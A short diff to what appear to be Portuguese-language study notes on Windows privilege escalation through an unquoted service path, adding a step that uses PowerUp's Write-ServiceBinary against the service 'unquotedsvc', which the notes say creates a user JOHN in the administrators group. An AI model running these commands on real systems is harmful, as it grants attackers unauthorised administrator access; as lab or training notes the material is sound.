@@ -163,7 +163,11 @@ Agora, paramos o servico e damos start novamente.
 > sc start unquotedsvc
 
 
+#### Usando o PowerUp com a funcao Write-ServiceBinary
 
+> Write-ServiceBinary -Name unquotedsvc -Path 'C:\Program Files\Unquoted Path Service\Common Files'
+ 
+Foi criado um user JOHN e adicionado no grupo de administrators.
 
 
 ----------------------------------------------------------------------------------------------------------------------------------------
